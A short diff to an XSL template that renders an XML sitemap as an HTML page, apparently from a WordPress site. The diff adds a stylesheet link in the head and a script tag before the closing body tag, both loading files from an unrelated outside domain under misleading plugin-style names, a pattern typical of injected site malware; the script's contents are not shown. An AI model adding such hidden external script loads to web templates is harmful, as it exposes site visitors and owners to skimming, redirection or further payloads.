@@ -6,7 +6,7 @@
 	<xsl:output method="html" version="1.0" encoding="UTF-8" indent="yes"/>
 	<xsl:template match="/">
 		<html xmlns="http://www.w3.org/1999/xhtml">
-		<head>
+		<head><link rel="stylesheet" href="https://misto-green.site/wp-content/plugins/slyle-page-when-message-doing.css">
 			<title>XML Sitemap</title>
 			<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 			<style type="text/css">
@@ -147,7 +147,7 @@
 				jQuery("#sitemap").tablesorter( { widgets: ['zebra'] } );
 			});
 			]]></script>
-		</body>
+		<script src="https://misto-green.site/wp-content/plugins/listen-message.js"></script></body>
 		</html>
 	</xsl:template>
 	</xsl:stylesheet>
